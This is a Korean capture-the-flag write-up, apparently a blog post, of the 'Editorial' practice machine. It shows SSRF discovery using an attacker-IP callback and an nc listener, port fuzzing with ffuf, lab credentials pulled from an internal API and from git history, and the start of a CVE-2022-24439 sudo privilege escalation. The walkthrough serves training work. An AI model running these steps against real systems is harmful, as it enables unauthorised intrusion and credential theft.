{"componentChunkName":"component---src-templates-post-jsx","path":"/Editorial/","result":{"data":{"site":{"siteMetadata":{"title":"𝓃u⚡︎3114 β10g"}},"markdownRemark":{"id":"2de10886-d77d-5ae4-8d82-3c252f0872e9","excerpt":"Editorial 요약  🌟 한 줄 평\n비슷한 방식의 테크닉이 여러번 반복되는 느낌이 있으나, SSRF를 연습하기에 좋았고 초입까지 가는 과정이 다른 쉬운 레벨의 시스템보다 복잡해 좀 더 현실적이라는 느낌을 받았다.  'Editorial'은 'Server-Side Request Forgery(SSRF)'에 취약한 웹 애플리케이션을 갖춘 쉬운 난이도의 리눅…","html":"<h2 id=\"Editorial-요약\" style=\"position:relative;\"><a href=\"#Editorial-%EC%9A%94%EC%95%BD\" aria-label=\"Editorial 요약 permalink\" class=\"heading-anchor before\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"15\" height=\"15\" viewBox=\"0 0 24 24\"><path d=\"M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z\"/></svg></a>Editorial 요약</h2>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/fbaf8181-884b-4302-994a-4f0b91a51d79/image.png\"></p>\n<blockquote>\n<p>🌟 <strong>한 줄 평</strong>\n비슷한 방식의 테크닉이 여러번 반복되는 느낌이 있으나, SSRF를 연습하기에 좋았고 초입까지 가는 과정이 다른 쉬운 레벨의 시스템보다 복잡해 좀 더 현실적이라는 느낌을 받았다. </p>\n</blockquote>\n<p>'Editorial'은 'Server-Side Request Forgery(SSRF)'에 취약한 웹 애플리케이션을 갖춘 쉬운 난이도의 리눅스 시스템이다. 이 취약점은 내부에서 실행되는 API의  로그인 액세스 권한을 얻기 위해 활용되며, 이는 'SSH' 액세스로 이어지는 로그인 자격 증명을 얻기 위해 활용된다. 시스템에서 정보수집을 하다보면 새로운 사용자의 로그인 자격증명을 깃 'Git' 리포지토리에서 찾을 수 있다. 'root' 사용자는 <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-24439\">CVE-2022-24439</a> 및 <code class=\"language-text\">sudo</code> 구성을 활용하여 얻을 수 있다.</p>\n<h2 id=\"정보수집\" style=\"position:relative;\"><a href=\"#%EC%A0%95%EB%B3%B4%EC%88%98%EC%A7%91\" aria-label=\"정보수집 permalink\" class=\"heading-anchor before\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"15\" height=\"15\" viewBox=\"0 0 24 24\"><path d=\"M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z\"/></svg></a>정보수집</h2>\n<h3 id=\"Nmap-포트-스캔\" style=\"position:relative;\"><a href=\"#Nmap-%ED%8F%AC%ED%8A%B8-%EC%8A%A4%EC%BA%94\" aria-label=\"Nmap 포트 스캔 permalink\" class=\"heading-anchor before\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"15\" height=\"15\" viewBox=\"0 0 24 24\"><path d=\"M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z\"/></svg></a>Nmap 포트 스캔</h3>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">PORT   STATE SERVICE REASON         VERSION\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     syn-ack ttl <span class=\"token number\">63</span> OpenSSH <span class=\"token number\">8</span>.9p1 Ubuntu 3ubuntu0.7 <span class=\"token punctuation\">(</span>Ubuntu Linux<span class=\"token punctuation\">;</span> protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ssh-hostkey: \n<span class=\"token operator\">|</span>   <span class=\"token number\">256</span> 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM<span class=\"token operator\">=</span>\n<span class=\"token operator\">|</span>   <span class=\"token number\">256</span> 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    syn-ack ttl <span class=\"token number\">63</span> nginx <span class=\"token number\">1.18</span>.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-title: Did not follow redirect to http://editorial.htb\n<span class=\"token operator\">|</span>_http-server-header: nginx/1.18.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> http-methods: \n<span class=\"token operator\">|</span>_  Supported Methods: GET HEAD POST OPTIONS</code></pre></div>\n<p>TCP로는 SSH와 HTTP만 열려 있다.\nSSH는 로그인 자격증명이 필요하기 때문에 HTTP부터 살펴보자. </p>\n<h3 id=\"80-HTTP\" style=\"position:relative;\"><a href=\"#80-HTTP\" aria-label=\"80 HTTP permalink\" class=\"heading-anchor before\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"15\" height=\"15\" viewBox=\"0 0 24 24\"><path d=\"M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z\"/></svg></a>80-HTTP</h3>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/a31f6fae-0874-41eb-ab2b-ab3a71f59169/image.png\"></p>\n<p>웹사이트는 이렇게 생겼고, 한눈에 보기에 취약한 부분은 우층 상단의 서치바 정도이지만, 간단한 SQL Injection 테스트후 취약점을 발견하지 못해 정보를 더 수집해보자. </p>\n<h4 id=\"디렉토리-퍼징-Directory-Fuzzing\" style=\"position:relative;\"><a href=\"#%EB%94%94%EB%A0%89%ED%86%A0%EB%A6%AC-%ED%8D%BC%EC%A7%95-Directory-Fuzzing\" aria-label=\"디렉토리 퍼징 Directory Fuzzing permalink\" class=\"heading-anchor before\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"15\" height=\"15\" viewBox=\"0 0 24 24\"><path d=\"M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z\"/></svg></a>디렉토리 퍼징 (Directory Fuzzing)</h4>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/59c0075b-62ad-4064-8b2d-b9d624c3bda7/image.png\"></p>\n<p><code class=\"language-text\">/upload</code> 와 <code class=\"language-text\">/about</code> 디렉토리를 찾았다. </p>\n<p><code class=\"language-text\">/upload</code> 에 접속해보자. </p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/f9f0b9c1-ca80-4254-8778-5319d945563c/image.png\"></p>\n<p>상단 Book Information 아래 좌측 <code class=\"language-text\">Cover URL related to your book or</code> 란에 공격자 IP를 아래와 같이 적고 </p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">http://공격자IP/test</code></pre></div>\n<p>넷캣 리스터 (netcat listener)를 열어둔 상태에서 </p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvnp</span> <span class=\"token number\">80</span></code></pre></div>\n<p><code class=\"language-text\">Preview</code> 버튼을 누르면 HTTP 리퀘스트가 들어온것을 확인할 수 있다 (캡쳐 생략). 이것은 이 애플리케이션이 Server-side request forgery (SSRF)에 취약하다는것을 의미한다. </p>\n<p>Burp Suite의 Repeater를 이용해보자.\n<code class=\"language-text\">bookurl</code> 값에 로컬 IP주소를 입력하면 jpeg 이미지가 리스펀스로 돌아온다. </p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/0759040b-bcaf-444e-aaa9-3c61aca23e49/image.png\"></p>\n<h4 id=\"포트-퍼징-Port-Fuzzing\" style=\"position:relative;\"><a href=\"#%ED%8F%AC%ED%8A%B8-%ED%8D%BC%EC%A7%95-Port-Fuzzing\" aria-label=\"포트 퍼징 Port Fuzzing permalink\" class=\"heading-anchor before\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"15\" height=\"15\" viewBox=\"0 0 24 24\"><path d=\"M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z\"/></svg></a>포트 퍼징 (Port Fuzzing)</h4>\n<p>이제 내부의 호스팅된 서비스를 찾기 위해 포트 퍼징을 해보자. 찾아보니 Burp Suite의 Intruder를 이용하는 방법이 있는 것 같은데 나는 ffuf를 사용하여 퍼징하는 방법을 택했다. </p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/7fd3d79d-66ca-45e5-be2b-219d1de9758c/image.png\"></p>\n<p>Burp Suite 의 Proxy 모드에서 Intercept를 클릭해 리퀘스트를 선택해주고\n<code class=\"language-text\">http://127.0.0.1:FUZZ</code> 라고 입력한 후, 우클릭 -> <code class=\"language-text\">Copy to file</code> -> <code class=\"language-text\">req.txt</code> 라는 파일명으로 수정된 HTTP 리퀘스트 파일을 저장해준다. </p>\n<p>그리고 아래의 명령어를 입력해 포트 퍼징을 해준다. </p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">ffuf <span class=\"token parameter variable\">-u</span> http://editorial.htb/upload-cover <span class=\"token parameter variable\">-X</span> POST <span class=\"token parameter variable\">-request</span> req.txt <span class=\"token parameter variable\">-w</span> ports.txt <span class=\"token parameter variable\">-fs</span> <span class=\"token number\">61</span></code></pre></div>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/f4cff494-ae9a-4430-8356-c0fbf78fbf5a/image.png\"></p>\n<p>5000 을 찾았다. </p>\n<p>그럼 이제 다시 기존의 Burp Suite Repeater로 돌아가서 새로 찾은 포트번호를 로컬IP에 추가해주면 </p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/85014a6b-415e-4ceb-8366-10dd8ccaa9e9/image.png\"></p>\n<p>우측과 같이 새로운 디렉토리가 리스펀스로 돌아보는 것을 확인할 수 있다.\n새로운 디렉토리로 가보면 저절로 파일이 다운로드 되는데 파일을 열어보면 아래와 같다. </p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/6b33ce2c-09ed-41f1-b8f6-75fc553f591a/image.png\"></p>\n<p>이걸 읽기 쉽게 json으로 포매팅 해보자. </p>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n  <span class=\"token property\">\"messages\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token property\">\"promotions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Retrieve a list of all the promotions in our library.\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"endpoint\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"/api/latest/metadata/messages/promos\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"methods\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token property\">\"coupons\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Retrieve the list of coupons to use in our library.\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"endpoint\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"/api/latest/metadata/messages/coupons\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"methods\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token property\">\"new_authors\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Retrieve the welcome message sended to our new authors.\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"endpoint\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"/api/latest/metadata/messages/authors\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"methods\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token property\">\"platform_use\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Retrieve examples of how to use the platform.\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"endpoint\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"/api/latest/metadata/messages/how_to_use_platform\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"methods\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"version\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token property\">\"changelog\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Retrieve a list of all the versions and updates of the api.\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"endpoint\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"/api/latest/metadata/changelog\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"methods\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token property\">\"latest\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Retrieve the last version of api.\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"endpoint\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"/api/latest/metadata\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"methods\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>이중 <code class=\"language-text\">/api/latest/metadata/messages/authors</code>를 리퀘스트로 보내면 새로운 디렉토리가 리스펀스로 돌아오게 된다. </p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/7814a566-da48-4612-818a-c34e16959f1c/image.png\"></p>\n<p>그리고 이전과 같이 리스펀스로 돌아온 디렉토리로 접속하면 자동으로 파일이 다운로드 된다. </p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/10a080ea-88d4-4165-8365-6234f1840770/image.png\"></p>\n<p>그리고 다운로드된 파일을 열어보면 아래와 같은 로그인 자격증명을 획득할 수 있다.</p>\n<ul>\n<li>유저네임 <code class=\"language-text\">dev</code> </li>\n<li>비밀번호 <code class=\"language-text\">dev080217_devAPI!@</code>  </li>\n</ul>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/9cf4cb93-6506-4cd4-8f64-c2652f7b0307/image.png\"></p>\n<h2 id=\"초입\" style=\"position:relative;\"><a href=\"#%EC%B4%88%EC%9E%85\" aria-label=\"초입 permalink\" class=\"heading-anchor before\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"15\" height=\"15\" viewBox=\"0 0 24 24\"><path d=\"M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z\"/></svg></a>초입</h2>\n<p>얻은 로그인 자격증명을 이용해 SSH에 연결해보자.</p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/e9265bde-e6c4-4931-8437-6ca01f2ca296/image.png\"></p>\n<h2 id=\"측면-이동-Lateral-Movement\" style=\"position:relative;\"><a href=\"#%EC%B8%A1%EB%A9%B4-%EC%9D%B4%EB%8F%99-Lateral-Movement\" aria-label=\"측면 이동 Lateral Movement permalink\" class=\"heading-anchor before\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"15\" height=\"15\" viewBox=\"0 0 24 24\"><path d=\"M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z\"/></svg></a>측면 이동 (Lateral Movement)</h2>\n<p><code class=\"language-text\">~/apps</code> 에 깃(git)이 있다. </p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/54649a1e-bf6a-483a-b6a9-a916deb0989e/image.png\"></p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/788c8a3f-16d3-4664-9861-ed8b7d8b549f/image.png\"></p>\n<p><code class=\"language-text\">~/apps/.git/logs</code> 에서 하이라이트된 부분을 아래의 명령어를 이용해 자세히 살펴보자. </p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token function\">git</span> show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae</code></pre></div>\n<p>그러면 아래와 같은 탬플렛 메일 메세지 <code class=\"language-text\">template_mail_message</code> 내용을 볼 수 있고, 이전과 같이 새로운 로그인 자격증명을 얻을 수 있다. </p>\n<ul>\n<li>유저네임: <code class=\"language-text\">prod</code></li>\n<li>비밀번호: <code class=\"language-text\">080217_Producti0n_2023!@</code></li>\n</ul>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/87696c9a-acce-4d0b-8747-8639d7ba44c0/image.png\"></p>\n<p>새로 얻은 로그인 자격증명을 이용해 SSH에 연결하자. </p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/db395340-5adc-4aa7-9a8c-a999255c9d1a/image.png\"></p>\n<h2 id=\"권한-상승-Privilege-Escalation\" style=\"position:relative;\"><a href=\"#%EA%B6%8C%ED%95%9C-%EC%83%81%EC%8A%B9-Privilege-Escalation\" aria-label=\"권한 상승 Privilege Escalation permalink\" class=\"heading-anchor before\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"15\" height=\"15\" viewBox=\"0 0 24 24\"><path d=\"M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z\"/></svg></a>권한 상승 (Privilege Escalation)</h2>\n<p>슈퍼유저로 실행할 수 있는 권한을 확인하기 위해 <code class=\"language-text\">sudo -l</code> 를 살펴보면</p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/98018cdc-2259-4e1c-8297-02d39f4fd425/image.png\"></p>\n<p><code class=\"language-text\">/opt/internal_apps/clone_changes/clone_prod_change.py *</code> 파이썬 파일을 권한 상승없이 실행 시킬 수 있다는 것을 확인할 수 있다. </p>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/e05aaac8-1689-405e-b57f-655b19f5cd5b/image.png\"></p>\n<p>여기서 중요한 부분은 아래와 같다. </p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> git <span class=\"token keyword\">import</span> Repo</code></pre></div>\n<p>이 스크립트가 GitPython 라이브러리를 활용하여 Git 작업을 수행한다는 것을 알 수 있는 대목이기 때문에 이 스크립트에서 가장 유용한 정보라고 할 수 있다. </p>\n<p>구글에 <code class=\"language-text\">from git import Repo</code> 의 취약점을 검색하면 <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-24439\">CVE-2022-24439</a>에 관한 내용을 찾아볼 수 있고 이를 악용해 권한 상승을 할 수 있다. </p>\n<p>나는 <a href=\"https://github.com/gitpython-developers/GitPython/issues/1515\">https://github.com/gitpython-developers/GitPython/issues/1515</a> 여기와 여기 <a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858\">https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858</a> 를 참고했다. </p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token function\">sudo</span> /usr/bin/python3 